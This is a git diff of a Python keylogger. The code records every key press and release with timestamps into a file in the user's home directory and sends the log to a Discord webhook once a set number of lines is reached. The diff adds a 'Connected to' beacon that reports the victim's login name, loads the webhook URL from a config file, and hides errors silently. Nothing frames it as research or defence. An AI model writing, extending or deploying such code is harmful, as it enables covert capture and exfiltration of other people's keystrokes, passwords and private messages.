@@ -1,7 +1,7 @@
 from pynput import keyboard
 from pathlib import Path
 from datetime import datetime
-from discord_webhook import DiscordWebhook
+from discord_webhook import DiscordWebhook, DiscordEmbed
 import os
 
 max_length = 17 # the longest keycode i could find was media_volume_down which is 17 characters long
@@ -15,7 +15,8 @@ def kill_switch():
         return True
 
 def check_if_should_send(lines):
-    if lines >= 300:
+    print(lines)
+    if lines >= max_lines:
         webhook = DiscordWebhook(url=url, username=str(os.getlogin()))
         file_path = Path.home() / "Source/main"
         file_path.parent.mkdir(parents=True, exist_ok=True)
@@ -146,36 +147,30 @@ def ascii_replace(key):
 def on_press(key):
     key_name = ascii_replace(key)
 
-    log = f"\n Pressed: {str(key_name).rjust(max_length)} | {datetime.now()}"
+    log = f" Pressed: {str(key_name).rjust(max_length)} | {datetime.now()}\n"
 
     file_path = Path.home() / "Source/main"
     file_path.parent.mkdir(parents=True, exist_ok=True)
 
     if not file_path.exists():
-        file_path.write_text(log.lstrip("\n"))
+        file_path.write_text(log)
     else:
-        with file_path.open('r+') as file:
-            if file.readline() == "":
-                file.write(log.lstrip("\n"))
-            else:
-                file.write(log)
+        with file_path.open('a') as file:
+            file.write(log)
 
 def on_release(key):
     key_name = ascii_replace(key)
 
-    log = f"\nReleased: {str(key_name).rjust(max_length)} | {datetime.now()}"
+    log = f"Released: {str(key_name).rjust(max_length)} | {datetime.now()}\n"
 
     file_path = Path.home() / "Source/main"
     file_path.parent.mkdir(parents=True, exist_ok=True)
 
     if not file_path.exists():
-        file_path.write_text(log.lstrip("\n"))
+        file_path.write_text(log)
     else:
         with file_path.open('r+') as file:
-            if file.readline() == "":
-                file.write(log.lstrip("\n"))
-            else:
-                file.write(log)
+            file.write(log)
             lines = len(file.readlines())
         check_if_should_send(lines)
 
@@ -187,7 +182,17 @@ if not kill_switch():
     file_path.parent.mkdir(parents=True, exist_ok=True)
 
     if file_path.exists():
-        with file_path.open('r') as file:
-            url = file.readline()
-        with keyboard.Listener(on_press=on_press, on_release=on_release) as l:
-            l.join()
+        try:
+            with file_path.open('r') as file:
+                url = file.readline().replace("\n","")
+                max_lines = int(file.readline())
+            webhook = DiscordWebhook(url=url, username="Keys")
+            embed = DiscordEmbed(title=f"Connected to {str(os.getlogin())}")
+            webhook.add_embed(embed)
+            response = webhook.execute()
+
+            if response.status_code != 401:
+                with keyboard.Listener(on_press=on_press, on_release=on_release) as l:
+                    l.join()
+        except:
+            pass
